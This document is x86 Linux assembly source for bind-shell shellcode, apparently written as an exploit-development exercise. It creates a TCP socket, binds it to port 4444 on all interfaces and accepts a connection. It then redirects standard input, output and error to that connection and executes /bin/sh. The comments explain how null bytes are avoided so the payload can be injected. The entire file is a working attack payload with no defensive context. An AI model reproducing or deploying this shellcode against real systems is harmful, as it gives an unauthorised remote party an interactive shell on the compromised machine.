global _start			

section .text
_start:
	
	; zero firt 5 registers
	sub eax, eax
	xor ebx, ebx
	sub ecx, ecx
	xor edx, edx
	sub esi, esi

	; -----socket call
	mov ax, 0x167 ; socket syscall value 359

	mov bl, 0x2 ; AF_INET constant

	mov cl, 0x1 ; SOCK_STREAM constant

	int 0x80

	; ------bind call -> bind(socketfd, &serv_addr, sizeof(serv_addr));

	mov ebx, eax ; copy socket file descpriptor as the first parameter

	; construct sockaddr_in
	push edx ; char sin_zero 
	push edx ; INADDR_ANY = unsigned long int 0 - last 4
	push edx ; INADDR_ANY = unsigned long int 0 - first 4
	
	push word 0x5c11 ; serv_addr.sin_port = htons(portno);

	push word 0x2 ; 	serv_addr.sin_addr.s_addr = INADDR_ANY /*unsigned long int 0*/;
	
	
	;add edx, 0x5c111113 ; 0x5c110002 first 2 bytes (0x2) for sin_family which is 2 bytes short and secod for sin_port which is inverted (big-endian) 2 bytes of target port

	;sub dx, 0x1111 ; we want edx to be 0x5c110002 in the end without having zeros in our shellcode 


	; push edx ; push sin_family  

	mov ecx, esp ; copy sockaddr_in address into esp as the second param

	sub edx, edx ; zero edx

	mov dl, 0x10 ; sockaddr_in length as a third param

	mov ax, 0x169 ; bind syscall value 361

	int 0x80

	; ------listen call -> listen(socketfd, 0); 

	; ebx should still contain our socked file descriptor

	mov ecx, eax ; eax should be zero if bind call was successful 

	mov ax, 0x16b ; listen syscall value 363

	int 0x80


	; ------accept call -> accept(socketfd, (struct sockaddr *) &cli_addr, &clilen)

	; ebx should still contain our socked file descriptor
	; it looks like &cli_addr and &clilen are not being inforced by kernel so we'll use leftovers from previous syscalls to save on shellcode size

	mov ax, 0x16c ; accept syscall value 364

	int 0x80


	; ------dup2 call -> dup2(newsockfd, 0); redirect STDIN to the accepted socket
	mov ebx, eax ; copy accepted socket file descpriptor as the first parameter for the dup2 syscalls (we'll reuse the same value for all three dup2 calls)

	; ecx should be zero already, so we don't have to do anything at the moment

	mov al, 0x3f ; dup2 syscall value 63

	int 0x80

	; ------dup2 call -> dup2(newsockfd, 1); redirect STDOUT to the accepted socket

	inc ecx ; bump up ecx by 1 for STDOUT

	mov al, 0x3f ; dup2 syscall value 63

	int 0x80


	; ------dup2 call -> dup2(newsockfd, 2); redirect STDERR to the accepted socket


	inc ecx ; bump up ecx by 1 for STDERR

	mov al, 0x3f ; dup2 syscall value 63

	int 0x80

	; -----execve call
	; PUSH the first null dword 
	sub eax, eax ; make sure eax is zero
	
	push eax ; this will be our null terminator for the "//bin/sh" string as well as act as null pointer for envp

	mov edx, esp ; envp pointer to null

	;PUSH //bin/sh (8 bytes) 

	push 0x68732f2f
	push 0x6e69622f

	
	mov ebx, esp ; target binary path - pointer to the "//bin/sh" string

	push eax ; argv and envp arrays must each include a null pointer at the end of the array. 

	mov ecx, esp ; argv[] cotaining 2 elements - pointer to //bin/sh and null pointer


	mov al, 0xb
	int 0x80



